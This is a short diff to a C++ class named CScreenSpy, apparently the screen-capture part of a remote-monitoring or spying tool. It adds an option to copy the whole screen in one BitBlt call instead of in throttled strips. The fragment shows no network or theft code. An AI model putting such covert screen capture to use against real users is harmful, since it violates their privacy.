@@ -200,10 +200,14 @@ VOID CScreenSpy::WriteRectBuffer(LPBYTE	szBuffer,ULONG ulLength)
 	m_RectBufferOffset += ulLength;
 }
 
+
 VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
 {
-	ULONG	ulJumpLine = 50;
-	ULONG	ulJumpSleep = ulJumpLine / 10; 
+#ifdef COPY_ALL
+	BitBlt(hdcDest, 0, 0, ulWidth, ulHeight, hdcSour, 0, 0, m_dwBitBltRop);
+#else
+	const ULONG	ulJumpLine = 50;
+	const ULONG	ulJumpSleep = ulJumpLine / 10; 
 
 	for (int i = 0, ulToJump = 0; i < ulHeight; i += ulToJump)
 	{
@@ -216,6 +220,7 @@ VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHei
 		BitBlt(hdcDest, 0, i, ulWidth, ulToJump, hdcSour,0, i, m_dwBitBltRop);
 		Sleep(ulJumpSleep);
 	}
+#endif
 }
 
 ULONG CScreenSpy::CompareBitmap(LPBYTE CompareSourData, LPBYTE CompareDestData, 
